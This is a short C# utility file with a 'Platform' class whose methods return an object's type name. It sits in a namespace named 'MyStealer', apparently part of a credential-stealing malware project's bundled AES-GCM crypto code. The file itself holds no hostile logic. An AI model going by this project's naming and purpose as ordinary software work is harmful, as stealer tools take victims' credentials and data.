using System;

namespace MyStealer.Utils.BcAesGcm
{
    internal static class Platform
    {
        internal static string GetTypeName(object obj) => GetTypeName(obj.GetType());

        internal static string GetTypeName(Type t) => t.FullName;
    }
}
